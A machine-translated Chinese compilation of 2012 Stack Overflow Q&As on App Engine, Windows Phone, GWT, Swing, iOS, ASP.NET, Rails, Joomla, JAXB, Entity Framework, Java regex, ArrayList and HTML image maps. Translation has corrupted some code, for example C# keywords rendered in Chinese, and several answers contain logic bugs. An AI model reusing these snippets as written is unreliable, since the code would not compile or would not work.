使用 create_deep_key 创建带有父元素[transform.create_deep_key](http://googleappengine.googlecode.com/svn/trunk/python/google/appengine/ext/bulkload/transform.py)的键。使用它有点棘手。我已成功创建父键，使用 xml 而不是 csv

以下是 bulkloader.yaml 中属性键的示例：

```
 - property: __key__ 
       external_name: key
       import_transform: transform.create_deep_key(('parentKind', 'parentKeyName'),
                                                   ('entityKind', transform.CURRENT_PROPERTY)) 
```

希望能帮助到你...

# windows-phone-7 - 如何从 Web 加载图像并将图像保存到独立存储？

> ID：10514229
> 
> 赞同：0
> 
> 时间：2012-05-09T10:26:49.470
> 
> 标签：windows-phone-7

字符串 url1 = "http://localhost/Images/Map.png";
我想从此链接加载图像“Map.png”，然后保存到独立存储。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-16T06:06:15.307

这对 Windows 8 手机很有用

[http://code.msdn.microsoft.com/wpapps/CSWP8ImageFromIsolatedStora-8dcf8411](http://code.msdn.microsoft.com/wpapps/CSWP8ImageFromIsolatedStora-8dcf8411)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:32:39.007

公共无效GetImages（）

```
 {

            WebClient m_webClient = new WebClient();

            Uri m_uri = new Uri("http://localhost/Images/Map.png");

            m_webClient.OpenReadCompleted += new OpenReadCompletedEventHandler(webClient_OpenReadCompleted);

            m_webClient.OpenReadAsync(m_uri);

        }             

   void webClient_OpenReadCompleted(object sender, OpenReadCompletedEventArgs e)
    {
        int count;

        Stream stream = e.Result;

        byte[] buffer = new byte[1024]; 
```

使用 (IsolatedStorageFile isf = IsolatedStorageFile.GetUserStoreForApplication())

```
 {

            // isf.Remove();
            //if (!isf.FileExists("map"))
            //{

            using (System.IO.IsolatedStorage.IsolatedStorageFileStream isfs = new IsolatedStorageFileStream("map", FileMode.Create, isf))
            {
                count = 0;

                while (0 < (count = stream.Read(buffer, 0, buffer.Length)))
                {
                    isfs.Write(buffer, 0, count);
                }

                stream.Close();
                isfs.Close();
            }
        } 
```

# javascript - 如何使用 gwt 从给定 url 的文档中提取内容？

> ID：10514231
> 
> 赞同：0
> 
> 时间：2012-05-09T10:26:57.113
> 
> 标签：javascript, gwt, web-scraping

我是 GWT 的新手，正在尝试构建一个网络抓取应用程序。我有一个自定义 URL，比如 www.amazon.com。我希望能够打开这个 url，从其源中抓取信息（最好通过将 html 内容存储为 gwt 中的文档）并在控制台上打印抓取的信息。

我尝试在当前页面中创建一个 iframe 并将其 src 设置为自定义 url。但这并没有成功。

如果您需要我详细说明/澄清问题的任何方面，请告诉我

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T17:29:28.753

抓取服务器上的 URL 并通过 servlet 写入输出。在 GWT 的对话框中打开此 Servlet URL。

或者，如果（报废页面的）内容可以以其他格式（如 HashMap）存储，那么您可以 RPC 服务器获取数据对象并将其显示在客户端的 HTML 面板中。

谢谢，斯里哈里。

# java - 仅在按下控制按钮两次时如何使 JFrame 可见

> ID：10514235
> 
> 赞同：2
> 
> 时间：2012-05-09T10:27:36.660
> 
> 标签：java, swing

我正在创建一个在后台运行的桌面应用程序，在单击控制按钮时它应该是可见的，我已经让`setVisible(false)`JFrame 知道如何做到这一点。如果您在桌面或任何应该可以工作的应用程序中单击控制按钮两次，则应触发该应用程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-11T02:39:19.213

这不能在您的应用程序中完成。

如果它在后台运行，它没有焦点，所以它不能对该事件做出反应。任何其他应用程序都可能具有焦点并有兴趣使用该 `Ctrl` 按钮。

考虑多个这样的程序，所有这些程序都针对那个按钮。应该通知哪个？想想 3 位编辑，他们都在输入下一个字符。

您的操作系统或 DE 可能有一种方法来定义热键，查看您的程序是否正在运行（一次？），并向您的应用程序发送消息。然后应用程序可能会做出反应。

# iphone - 如何仅在月份、日期、年份和时间中更改我的日期选择器显示

> ID：10514236
> 
> 赞同：1
> 
> 时间：2012-05-09T10:27:43.533
> 
> 标签：iphone

默认的 UIDatePicker 显示日期和时间。我只需要像这样显示月、日、年和时间

![在此处输入图像描述](../Images/22eec738074fc38f698705fce21f6644.png)

如何将日期选择器更改为此？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-10T01:22:52.457

好吧，首先我建议通读[UIDatePicker](http://developer.apple.com/library/ios/#DOCUMENTATION/UIKit/Reference/UIDatePicker_Class/Reference/UIDatePicker.html)文档。以下是日期选择器模式：

```
Date Picker Mode
The mode of the date picker.

typedef enum {
   UIDatePickerModeTime,
   UIDatePickerModeDate,
   UIDatePickerModeDateAndTime,
   UIDatePickerModeCountDownTimer
} UIDatePickerMode; 
```

如果你在那里找不到你需要的东西。[然后，您可以使用UIPickerView](http://developer.apple.com/library/ios/#documentation/UIKit/Reference/UIPickerView_Class/Reference/UIPickerView.html)创建自己的。

# c# - FormView.InsertItemTemplate 中的 ITemplate 在回发后消失

> ID：10514237
> 
> 赞同：1
> 
> 时间：2012-05-09T10:27:46.913
> 
> 标签：c#, asp.net, formview, itemplate

我有一个 UserControl，其中有一个 FormView。

表单视图只有一个 InsertItemTemplate （我不需要其他任何东西）

```
<irt:FormView ID="FormViewInsertEvent" DefaultMode="Insert" runat="server" DataKeyNames="EVENT_ID"
    DataSourceID="SqlDataSourceIocEvents">        
    <InsertItemTemplate>
        //Some form elements (text boxes and labels etc.) which are common

        <%if (CustomContent != null)
          { %>
        <hr />
        <asp:PlaceHolder runat="server" ID="PlaceHolderCustomContent"></asp:PlaceHolder>
        <%} %>   

        // Link buttons with insert command
    </InsertItemTemplate>
</irt:FormView> 
```

后面的代码是这样的：

```
public partial class EventControl : System.Web.UI.UserControl
{
    protected void Page_Load(object sender, EventArgs e)
    {

        if (CustomContent != null)
        {
            Control ph = FormViewInsertEvent.FindControl("PlaceHolderCustomContent");                
            CustomContent.InstantiateIn(ph);

        }

    }

    [
    DefaultValue(null), 
    PersistenceMode(PersistenceMode.InnerProperty),
    TemplateInstance(TemplateInstance.Single),        
    Browsable(false)
    ]
    public ITemplate CustomContent { 
        get; 
        set; 
    }
} 
```

在调用者（页面）中，我有这样的事情（我将数据源传递给 UC 并从后面的代码中设置 FormView 的数据源。这没有问题）：

```
<irt:EventControl ID="EventControl" runat="server" DataSourceID="SqlDataSourceIocEvents">   
    <CustomContent>

        Custom Field: 
        <asp:TextBox ID="TextBoxCustomField" runat="server" Text='<%# Bind("CustomField") %>' />

    </CustomContent>
</irt:EventControl> 
```

我的问题是；当我单击链接按钮和 PostBack 时，自定义内容（即我放在模板字段中的内容）消失了。

如果我将 asp:PlaceHolder 放在 FormView.InsertItemTemplate 之外，则没有问题。但这不是我需要的。

即使在回发之后，我也需要在 InsertItemTemplate 中保留 ITemplate。看起来我的模板被添加到 PlaceHolder 的控制列表中，但是在 PreRender 和 Render 之间的某个地方，这些控件被删除了。

有任何想法吗？

谢谢南顿

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-06T20:35:01.653

我前段时间解决了这个问题，所以我不完全记得解决方案（我急于发布这个试图帮助某人）我相信你在下面看到的类和属性属性解决了这个问题。

请注意，Irt.Web.ServerControls.PlaceHolder 只是一个派生自 System.Web.UI.WebControls.PlaceHolder 控件的类。如果这解决了问题，请标记它。

```
[PersistChildren(true)]
public partial class EventControl : UserControl
{

    protected override void OnInit(EventArgs e)
    {
        if (CustomContent != null)
        {
            CustomContent.InstantiateIn(PlaceHolderCustomContent);
        }
        base.OnInit(e);
    }

    public string ComponentLabel { get; set; }

    public string ComponentValue { get; set; }

    [DefaultValue(null)]
    [PersistenceMode(PersistenceMode.InnerProperty)]
    [TemplateContainer(typeof(Irt.Web.ServerControls.PlaceHolder), System.ComponentModel.BindingDirection.TwoWay)]
    [TemplateInstance(TemplateInstance.Single)]
    [Browsable(false)]
    [Bindable(true, BindingDirection.TwoWay)]
    public ITemplate CustomContent
    { 
        get; 
        set; 
    }

} 
```

# ruby-on-rails - Rails 2.3：如何获取 ActiveRecord 错误类型？

> ID：10514238
> 
> 赞同：0
> 
> 时间：2012-05-09T10:27:48.783
> 
> 标签：ruby-on-rails, activerecord

我在 Rails 2.3.8 上；我有这个模型：

```
class Coupon < ActiveRecord::Base

  validate :foo

  def foo
    errors.add_to_base :foo_error
  end
end 
```

我的目的是检索错误的类型，例如：

```
c = Coupon.new
c.valid?
c.errors.types #=> [[:base, :foo_error]] 
```

我设法检索了错误类型，但使用了一个非常奇怪的猴子补丁：

```
# in config/initializers/active_record_errors_types.rb
module ActiveRecord
  class Errors
    def types
      instance_variable_get(:@errors).map do |k,v| 
        [ k.to_sym, v[0].instance_variable_get(:@type) ]
      end
    end
  end
end

c = Coupon.new
c.valid?
c.errors.types #=> [[:base, :foo_error]] 
```

您知道检索错误类型的更好方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:18:04.837

尝试这个：

```
module ActiveRecord
  class Errors
    def types
      @errors.values.flatten.map(&:type).uniq
    end
  end
end 
```

如果您想避免猴子修补，您可以直接在 AR 对象上进行调用。

```
user.errors.instance_variable_get(:@errors).values.flatten.map(&:type).uniq 
```

或者，您可以执行以下操作：

```
[].tap {|types| user.errors.each_error{|a,e| types << e.type}}.uniq 
```

# joomla - 将代码片段添加到第三方 Joomla 主题的最简单方法是什么？

> ID：10514240
> 
> 赞同：0
> 
> 时间：2012-05-09T10:27:52.613
> 
> 标签：joomla, joomla-extensions, joomla-module

对 Joomla 来说是全新的。希望我的要求简单快捷。

我认为它是模块（最简单的方法）。所以我创建了它，让它正确地包含所需的脚本和样式，让它只显示在主页上。但是现在它显示出来了，它出现在一个默认的模块结构中，带有一个标题和模块内容容器。我不能在没有额外标记的情况下简单地注入我的代码段吗？只是一个带有 id 和脚本标签的 div？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-11T23:26:39.427

您可以为 Joomla 创建一个系统插件并使用 onAfterFilter 事件将您的脚本和样式添加到文档中。

```
$doc = JFactory::getDocument();
$doc->addScript("http://www.example.com/js/myscript.js");
$doc->addStyleSheet("http://www.example.com/css/mystylesheet.css"); 
```

可以在此处找到有关如何创建插件的文档：http: [//docs.joomla.org/Plugin](http://docs.joomla.org/Plugin)

# java - 解组时出错“类型不匹配：无法从 XmlAccessType 转换为 AccessType”

> ID：10514244
> 
> 赞同：1
> 
> 时间：2012-05-09T10:28:09.087
> 
> 标签：java, xml, xsd, jaxb

我正在使用 Jaxb，Unmarshalling an x​​ml。我正在使用 java 1.6。这是通过 JWSDP 2.0 生成的类。(xjc.bat) 但我的问题是我无法编译生成的类。我收到如下所示的语法错误。

> **“类型不匹配：无法从 XmlAccessType 转换为 AccessType”**

```
import javax.xml.bind.annotation.XmlAccessType;
import javax.xml.bind.annotation.XmlAccessorType;
import javax.xml.bind.annotation.XmlElement;
import javax.xml.bind.annotation.XmlType;

@XmlAccessorType(XmlAccessType.FIELD)// here i am getting sytax error
@XmlType(name = "personinfo", propOrder = {
    "firstname",
    "lastname",
    "address"
})
public class Personinfo {

    @XmlElement(required = true)
    protected String firstname;
    @XmlElement(required = true)
    protected String lastname;
    @XmlElement(name = "Address", required = true)
    protected PersonAddress address;
............................ 
```

任何人都可以在这方面提供帮助，

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T10:54:26.063

我使用下面的演示代码尝试了`Personinfo`您问题中的课程，并且一切正常。由于您使用的是 Java SE 6（其中包括 JAXB 实现），因此您需要确保您的类路径中没有来自 JWSDP 2.0 的任何 JAXB API。

我还建议使用 Java SE 6 中的 XJC 实用程序而不是 JWSDP，因为 JWSDP 已经很老了：

*   [http://java.sun.com/webservices/downloads/previous/webservicespack.jsp](http://java.sun.com/webservices/downloads/previous/webservicespack.jsp)

**演示**

```
package forum10514244;

import java.io.File;
import javax.xml.bind.*;
import javax.xml.transform.stream.StreamSource;

public class Demo {

    public static void main(String[] args) throws Exception {
        JAXBContext jc = JAXBContext.newInstance(Personinfo.class);

        File xml = new File("src/forum10514244/input.xml");
        Unmarshaller unmarshaller = jc.createUnmarshaller();
        JAXBElement<Personinfo> je = unmarshaller.unmarshal(new StreamSource(xml), Personinfo.class);

        Marshaller marshaller = jc.createMarshaller();
        marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, true);
        marshaller.marshal(je, System.out);
    }

} 
```

**输入.xml/输出**

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<root>
    <firstname>Jane</firstname>
    <lastname>Doe</lastname>
    <Address/>
</root> 
```

# iphone - 如何使用objective-c在标注视图的字幕中添加超链接

> ID：10514245
> 
> 赞同：0
> 
> 时间：2012-05-09T10:28:13.013
> 
> 标签：iphone, objective-c

在我的 iPhone 应用程序中，我需要在标注视图的字幕中显示指向网站的超链接。我正在使用显示地图类 url[有人可以指出此代码中的泄漏吗？](https://stackoverflow.com/questions/4710049/can-someone-point-me-to-a-leak-in-this-code)

我需要在 subtitle.help 我中添加超链接

由湿婆米

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:43:58.370

我认为您可以通过这种方式满足您的要求..

```
- (MKAnnotationView *) mapView:(MKMapView *)mapView viewForAnnotation:(id <MKAnnotation>) annotation{

    MKPinAnnotationView *locationView;

    locationView=[[[MKPinAnnotationView alloc] initWithAnnotation:annotation reuseIdentifier:@"currentloc"] autorelease];

    locationView.pinColor=MKPinAnnotationColorPurple;
    locationView.animatesDrop=TRUE;
    locationView.canShowCallout =YES;
    locationView.annotation=annotation;
    locationView.calloutOffset = CGPointMake(-5, 5);
    UITextView *text=[[UITextView alloc] initWithFrame:CGRectMake(0, 0, 100, 30)];
    text.dataDetectorTypes=UIDataDetectorTypeLink ;
    text.backgroundColor=[UIColor clearColor];
    text.editable=NO;
    text.text=@"http://google.com";
    locationView.rightCalloutAccessoryView = text;
    return locationView;
} 
```

# asp.net - 如何首先将EF代码中的主键映射到非主键？

> ID：10514251
> 
> 赞同：0
> 
> 时间：2012-05-09T10:28:32.940
> 
> 标签：asp.net, asp.net-mvc-3, entity-framework, linq-to-entities, ef-code-first

我有两张桌子

```
public class Table1
{
[Key]
int ID{get; set;}
Table2 table2{get; set;}
}
public class Table2
{
[Key]
int ID{get; set;}
int table1ID{get; set;}
//no instance of table i.e is relationship is uni-directional only
} 
```

如何使用 Table1.ID 和 Table2.table1ID 设置 table1 与 table2 的关系？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:40:07.963

以此为例：

```
public class Table1
{
[Key]
int ID{get; set;}
Table2 table2{get; set;}
}
public class Table2
{
[Key]
int ID{get; set;}
int table1ID{get; set;}

[ForeignKey("table1ID")]
Table1 table1{get; set;}
//no instance of table i.e is relationship is uni-directional only
} 
```

这意味着，`Table2`有一个`Table1`引用 ( `table1`) 并且它的外键是通过将其`ForeignKeyAttribute`设置为“table1ID”来指定的。

# java - 在 xmpp 中创建一种所有聊天、群组消息和不同 pubsub 出版物的个人聚合

> ID：10514255
> 
> 赞同：0
> 
> 时间：2012-05-09T10:28:50.017
> 
> 标签：java, javascript, web-services, xmpp, openfire

对不起，也许是一个愚蠢的问题和我的英语.. 我想用我的 xmpp 客户端创建所有消息（聊天，组）和帖子（来自 pubsub 服务）的个人聚合（例如，来自不同 pubsubs 的新私人消息和帖子将被聚合在一个地方（已读和未读消息）。此外，是否可以在不同资源上接收带有帖子的聚合流（即使某些消息已在一台设备上读取但并非所有消息都已读取）？

xmpp有可能吗？我是否必须创建一个专用的个人（用户）发布订阅，我将向其转发（发布）所有消息（或为此提供一种网络服务，可以访问表“收件箱”来存储消息）。因此，无论我的哪个客户端首先上线，都会从不同的 pubsub 收集私人消息和帖子，然后转发到专用的 pubsub（或 Web 服务），我的其他资源将从那里获取消息，因为所有客户端也都订阅了专用的pubsub。我的想法对吗？我希望这不是我在这里写的所有垃圾。

或者有一个XEP吗？

请，请帮助..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T12:49:17.007

为了能够通知和监控不同设备上的其他客户端，同时需要在不同的客户中将哪些消息标记为未读，您将需要编写大量样板代码。

当然，您将需要一个集中式 Web 服务来接收发布流（与您的客户端并行或首先接收它们然后发送到客户端）。Pub/sub 适合此应用程序，但您还需要从您的客户端向服务发送一些附加数据，例如上次阅读消息的时间戳（以便将所有较新的消息标记为未读）。

我认为最简单的方法是使用 web 服务作为网关，所有流最初都将被定向，您还可以在其中监控交付的内容和交付给哪个客户端。

希望它有所帮助

# java - 使用 JAVA REGEX 搜索任何给定的字符串

> ID：10514258
> 
> 赞同：0
> 
> 时间：2012-05-09T10:29:00.290
> 
> 标签：java, regex, pattern-matching, matcher

我正在尝试编写一个通用方法，该方法将在文件中搜索给定字符串并将其替换为另一个字符串。我正在使用 java 正则表达式

```
patternMatcher = Pattern.compile(searchString);
while ((line = readLine()) != null) {
    Matcher regexMatcher = patternMatcher.matcher(line);
       if (regexMatcher.lookingAt()) {
          line = regexMatcher.replaceAll(replaceString); 
```

..很快

只要搜索字符串位于文件中每一行的开头，此逻辑就有效。否则不会发生模式匹配。任何人都可以提出解决方案吗？

例如。我的搜索字符串是“This”，替换字符串是“That”
输入文件包含：`This is not This funny`
输出：`That is not That funny`

但是当
输入文件包含：`007 This is not This funny`
输出：`007 This is not This funny`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:40:23.410

不应该是……吗？

```
patternMatcher = Pattern.compile(searchString);
while ((line = readLine()) != null) {
    Matcher regexMatcher = patternMatcher.matcher(line);
       while (regexMatcher.find()) {
          line = regexMatcher.replaceAll(replaceString); 
```

考虑到限定符可能会影响结果，也许搜索字符串应该是“(this)+”或“(this)+?”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:47:26.837

我不熟悉 Java，但根据文档，`lookingAt`查看字符串的开头。我会跳过去寻找比赛，`replaceAll`不管有没有比赛，我都会盲目奔跑；如果没有匹配，它将不会替换任何内容。

如果由于某种原因您需要在尝试替换之前查找匹配项（这很浪费），那么正确的函数是`find`. 请参阅[http://docs.oracle.com/javase/1.4.2/docs/api/java/util/regex/Matcher.html](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/regex/Matcher.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T10:31:14.980

如果您正在搜索常量字符串而不是模式，那么您不应该使用正则表达式的原因有很多：

*   用户可能会输入一些在正则表达式语法中具有特殊含义的字符。
*   与子字符串搜索相比，正则表达式速度较慢。
*   您不希望允许用户使用比您想要的更多的功能（使用正则表达式匹配）。

使用`String.indexOf`和/或`String.replace`代替。

```
while ((line = readLine()) != null)
    if (line.indexOf(searchString) != -1 )
        line.replace(searchString, replaceString); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T11:32:42.120

如果内存不是问题，您可以将整个文件读取为 String 并`public String replaceAll(String regex, String replacement)`在 String API 中使用。

# java - 获取我刚刚添加到 Java/Android 中的 ArrayList 的对象的索引

> ID：10514260
> 
> 赞同：2
> 
> 时间：2012-05-09T10:29:06.730
> 
> 标签：java, android, list, arraylist, indexing

我想将一系列对象加载到 ArrayList 中，并返回添加位置的索引，以便以后可以直接从 ArrayList 中使用它。这类似于我为一个图形加载一组 5 帧并直接从列表中调用第 3 帧的数据。
在查看了一些可能相关的潜在帖子后，我发现了一些相关的东西，这让我感到好奇。甚至有内置函数来获取最近添加的对象的索引吗？

我正在查看的链接让我想到了这一点：[ArrayList indexOf() 返回错误的索引？](https://stackoverflow.com/questions/3113696/arraylist-indexof-returns-wrong-index)

基本上，我看待它的方式是我会按照以下伪代码的方式做一些事情：

```
 private ArrayList<FrameData> mylistofframeshere = new ArrayList();
    FrameData Framenumberone = new FrameData(constructorblah goes in here);
    int wherediditgo = mylistofframeshere.add(Framenumberone); 
```

或者我认为我可以做一些类似的事情

```
 mylistofframeshere.getindex(Framenumberone); 
```

在这一点上，我的编码背景更多地基于程序，所以我更习惯于知道索引是什么，只是为了将数据放在开头。我也查看了 oracle 文档，发现类似于上面的链接。有什么建议么？？

**编辑：**我将在这里添加一些额外的说明，因为我真的没有在示例和解释上付出足够的努力。

另一个尝试使用列表的直接索引之类的示例是，如果我有一组我想用作游戏或其他东西的地形的图块。我会将该区域的一组可能的图块加载到中央 ArrayList 中。在尝试放置这些图块时，我只会引用我在 ArrayList 中的预加载对象，以便绘制适当的位图/其他内容。

我对 Java 还是有点陌生​​，所以我敢打赌，这只是我在使用这些数据类型的机制上忽略了一些简单的事情。我会继续编辑这个，直到我得到正确的解释。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-09T10:33:34.937

当您向 中添加内容时`ArrayList`，它会转到最后一个可用空间。换句话说：

```
List<FrameData> list = new ArrayList<FrameData>();
list.add(frame1);

FrameData frame = list.get(list.size() - 1); //frame == frame1 
```

但我想知道你为什么需要这样做。如果您更多地解释您要达到的目标，可能会有不同/更好的方法来获得相同的结果。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T10:36:16.953

有一种方法`ArrayList.indexOf(object);`，尝试使用该方法获取对象的索引

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T10:57:22.417

`ArrayList`您可以使用`Map<Integer,FrameData>`. 你可以`Integer`用任何可能更适合你的项目的东西来替换。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T10:54:32.753

这完全取决于您要将索引用于什么。如果您只需要将列表中的每个元素映射到一个键，以便以后可以使用该键检索元素，那么您也许应该考虑使用 HashMap。如果您更关心排序，可以使用 List。正如有人已经回答的那样，当您将元素添加到列表中时，索引会增加。如果您事先知道您将拥有的帧总数，则可以通过将大小作为参数传递给其构造函数来初始化 ArrayList，然后通过手动指定索引来添加每个帧 list.add(0...size -1，元素）。

简而言之，

1.  如果您只是想通过自己的键/递增键存储和检索 -> 使用 HashMap。
2.  如果排序很重要，请使用列表。

# android - 如何在不使用静态或调用 startActivity()/startActivityForResult 的情况下从暂停的活动中访问（和编辑）数据

> ID：10514261
> 
> 赞同：0
> 
> 时间：2012-05-09T10:29:11.327
> 
> 标签：android, search, android-activity, argument-passing

我在我的源代码中实现了一个搜索功能，当用户单击他设备上的搜索按钮或我的操作栏中的搜索按钮时，该功能将启动。如果他单击我的操作栏上的那个，我只需调用`onSearchRequested`. 现在这是我的问题：

搜索完成后，我在 ListView 中显示结果。如果用户单击我想要的项目返回到我的`MainActivity`（当应用程序未完成时将始终存在）并在那里修改一些值并调用 Main 方法。

我知道有，`startActivityForResult`但我不知道如何实现它，因为如果用户点击他设备的搜索按钮，应用程序会自动调用`onSearchRequested`......所以我想到的唯一解决方案是实现一个静态方法在我的 Main-Activity 中，我可以从显示我的搜索结果的 Activity 中调用它。但这不是一个很好的解决方案（或者？）！

总结一下我的问题：是否有一种优雅的方法可以从显示搜索结果的活动返回到我的主要活动并在不使用`startActivityForResult`或在 Main 中实现静态方法的情况下传输数据？

十分感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:02:36.173

实施`startActivityForResult`非常容易。[这](http://www.vogella.com/articles/AndroidIntent/article.html)可能会帮助你。

# html - HTML 图像映射停止工作？

> ID：10514263
> 
> 赞同：0
> 
> 时间：2012-05-09T10:29:15.763
> 
> 标签：html, imagemap

几年来，我一直使用这种方法与我的一位客户切入正题，并且多年来一直有效。但是由于某种原因，这组特定的图像映射无法正常工作，我看不到让我感到困惑的地方。

[http://newyorkbarshow.com/index.php?loc=seminars](http://newyorkbarshow.com/index.php?loc=seminars)

```
<img src="/imgs/i2012/seminar2012-1.png" alt="page 1" width="580" height="916" border="0" usemap="#Map" />
<map name="Map" id="Map">
  <area shape="rect" coords="219,225,274,282" href="/index.php?loc=article&id=128" />
  <area shape="rect" coords="518,216,573,270" herf="/index.php?loc=article&id=131" />
  <area shape="rect" coords="219,303,274,357" herf="/index.php?loc=article&id=129" />
  <area shape="rect" coords="520,279,575,331" herf="/index.php?loc=article&id=132" />
  <area shape="rect" coords="220,386,274,440" herf="/index.php?loc=article&id=x" />
  <area shape="rect" coords="318,396,350,427" herf="/index.php?loc=article&id=x" />
  <area shape="rect" coords="354,397,385,427" herf="/index.php?loc=article&id=x" />
  <area shape="rect" coords="392,397,421,427" herf="/index.php?loc=article&id=x" />
  <area shape="rect" coords="428,396,457,427" herf="/index.php?loc=article&id=x" />
  <area shape="rect" coords="464,395,495,430" herf="/index.php?loc=article&id=x" />
  <area shape="rect" coords="517,385,573,440" herf="/index.php?loc=article&id=114" />
  <area shape="rect" coords="223,509,274,564" herf="/index.php?loc=article&id=x" />
  <area shape="rect" coords="155,575,212,630" herf="/index.php?loc=article&id=x" />
  <area shape="rect" coords="218,576,275,632" herf="/index.php?loc=article&id=128" />
  <area shape="rect" coords="518,549,573,604" herf="/index.php?loc=article&id=133" />
  <area shape="rect" coords="517,633,571,690" herf="/index.php?loc=article&id=28" />
  <area shape="rect" coords="220,676,274,730" herf="/index.php?loc=article&id=x" />
  <area shape="rect" coords="219,776,273,830" herf="/index.php?loc=article&id=130" />
  <area shape="rect" coords="519,820,572,872" herf="/index.php?loc=article&id=139" />
  <area shape="rect" coords="301,821,513,900" href="/index.php?loc=article&id=141" />
</map>
<br />
<img src="/imgs/i2012/seminar2012-2.png" alt="page 2" border="0" usemap="#Map2" />
<map name="Map2" id="Map2">
  <area shape="rect" coords="213,220,271,277" herf="/index.php?loc=article&id=134" />
  <area shape="rect" coords="515,222,570,278" herf="/index.php?loc=article&id=143" />
  <area shape="rect" coords="215,288,268,344" herf="/index.php?loc=article&id=x" />
  <area shape="rect" coords="215,372,271,427" herf="/index.php?loc=article&id=135" />
  <area shape="rect" coords="215,458,271,510" herf="/index.php?loc=article&id=136" />
  <area shape="rect" coords="515,430,570,486" herf="/index.php?loc=article&id=x" />
  <area shape="rect" coords="218,522,273,585" herf="/index.php?loc=article&id=138" />
  <area shape="rect" coords="514,523,570,576" herf="/index.php?loc=article&id=134" />
  <area shape="rect" coords="515,588,570,643" herf="/index.php?loc=article&id=x" />
  <area shape="rect" coords="217,612,270,667" herf="/index.php?loc=article&id=140" />
  <area shape="rect" coords="215,693,271,749" herf="/index.php?loc=article&id=142" />
  <area shape="rect" coords="515,744,570,800" herf="/index.php?loc=article&id=145" />
  <area shape="rect" coords="295,223,510,342" href="/index.php?loc=article&id=144" />
  <area shape="rect" coords="11,456,213,569" herf="/index.php?loc=article&id=137" />
</map>
<br />
<img src="/imgs/i2012/seminar2012-3.png" alt="page 3" border="0" usemap="#Map3" />
<map name="Map3" id="Map3">
  <area shape="rect" coords="345,480,550,493" herf="http://nyworldwineandspiritscompetition.com" />
  <area shape="rect" coords="393,543,578,779" herf="/index.php?loc=article&id=127" />
  <area shape="rect" coords="17,546,208,779" herf="/index.php?loc=article&id=x" />
  <area shape="rect" coords="260,731,348,742" herf="http://doctickets.com" />
</map> 
```

起初我想可能是因为我在 mac 上它与浏览器支持有关，但在 mac 和 2 台电脑上的所有浏览器上尝试后，我意识到它不是。有趣的是 [http://newyorkbarshow.com/index.php?loc=archive-2011](http://newyorkbarshow.com/index.php?loc=archive-2011)是去年，它工作正常。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T11:19:04.120

我不确定这是否是解决方案，但您在大多数链接中输入**了 herf**而不是**href 。**

# .net - 每天点击一次网址

> ID：10514264
> 
> 赞同：2
> 
> 时间：2012-05-09T10:29:16.833
> 
> 标签：.net

我想确保在我的.net 内置网站中每天点击一次（且仅一次）链接，我在共享服务器上，因此无法运行可执行文件 - 并且无法访问 24 小时开机的电脑创建计划任务。

我有哪些选择？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:34:32.257

您可以使用缓存类 - 添加新缓存条目时，您可以将其设置为在 24 小时内过期，并传入事件处理程序以在它过期时执行。

在事件处理程序中，您可以重置缓存条目。

见[`Cache.Add`](http://msdn.microsoft.com/en-us/library/system.web.caching.cache.add.aspx)和参数`onRemoveCallback`：

> onRemoveCallback - 类型：`System.Web.Caching.CacheItemRemovedCallback` 如果提供，则在从缓存中删除对象时调用该委托。当应用程序的对象从缓存中删除时，您可以使用它来通知应用程序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T10:36:23.967

cron 工作有可能吗？

```
0 0 * * * curl -q http://www.example.com/page.aspx 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T11:10:18.397

那么，您最好的选择是静态构造函数 + 计时器 + 一些确保它每天只运行一次的安全措施。

您可能需要改进它以确保一些事情，例如不要等待一整天的第一次运行。如果上一次运行是 23 小时前，请不要等待一整天。一些数学本质上是为了确保下一次运行是从运行后 24 小时开始的。

就像是，

```
private static DateTime _lastNavigated;
private static Timer _myTimer

static MyObject()
{
    _myTimer = new Timer(24 * 60 * 60 * 1000);
    _myTimer.Elapsed += MyOnceADayCode;
    _myTimer.Enabled = true;
}

public static void MyOnceADayCode(object source, ElapsedEventArgs e)
{
    _lastNavigated = DateTime.UtcNow;
    if (DateTime.UtcNow > _lastNavigated.AddDays(1))
    {
        // Haven't navigated in the last day, need to navigate again
    }
} 
```

另一个想法（取决于您的帐户是否可以访问）是创建（使用代码）计划任务。有一些很好的包装类使用 COM 为您完成所有工作。您仍然需要一个静态构造函数来确保代码在应用加载时执行。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T11:13:14.947

要使用 ASP.NET 在您的网站内执行计划任务，我建议您阅读[这篇文章](http://www.codeproject.com/Articles/12117/Simulate-a-Windows-Service-using-ASP-NET-to-run-sc)。

# python - 将函数字典转换为结果字典所需的python技巧

> ID：10514270
> 
> 赞同：1
> 
> 时间：2012-05-09T10:29:37.953
> 
> 标签：python, dictionary

我目前对如何有效地做到这一点一无所知。我考虑过使用对象，但我看不出它们在这种情况下如何提供帮助。有任何想法吗？

